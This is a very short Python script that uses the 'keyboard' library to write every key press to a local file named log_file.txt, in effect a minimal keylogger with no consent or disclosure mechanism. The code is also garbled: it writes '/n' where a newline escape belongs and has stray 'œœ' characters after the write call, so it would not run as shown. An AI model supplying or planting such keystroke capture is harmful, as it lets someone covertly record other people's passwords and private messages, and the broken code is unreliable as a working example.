import keyboard
log_file = "log_file.txt"
def key_pressed(event):
    with open(log_file,"a") as f:
        f.write('{}/n'.format(event.name))œœ

keyboard.on_press(key_pressed)

keyboard.wait()